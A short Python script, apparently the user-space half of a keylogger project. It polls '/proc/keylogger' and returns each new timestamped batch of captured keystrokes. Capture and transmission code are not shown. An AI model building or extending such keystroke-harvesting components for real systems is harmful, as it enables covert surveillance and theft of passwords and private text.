import re 
import os
import time
from helperFunctions import readFile

lastLogTime = ""

def fetchAll(): 
    """
    This function reads /proc/keylogger and processes it.

    Returns:
        array: contents of the log file.
    """
    try:
        logFile = readFile("/proc/keylogger")

        if logFile:
            try:
                date, time, content = logFile.split()
                global lastLogTime 
                if(time!= lastLogTime):
                    print(time,"!=",lastLogTime)
                    lastLogTime=time
                    return [date, time, content]
            except:
                return None
        else:
            return None 
    except:
        return None 
fetchAll()
